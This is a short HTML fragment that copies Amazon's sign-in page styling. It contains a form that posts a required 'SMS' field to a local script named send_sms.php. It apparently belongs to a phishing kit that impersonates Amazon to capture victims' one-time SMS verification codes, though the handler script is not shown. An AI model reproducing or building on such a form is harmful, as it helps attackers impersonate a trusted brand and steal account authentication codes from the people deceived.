...
<div class="a-section a-spacing-base">
  <div class="a-section">
    ...
    <form name="signIn" method="post" action="./system/send_sms.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
...
<input required="" type="text" maxlength="128" id="SMS" name="SMS" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
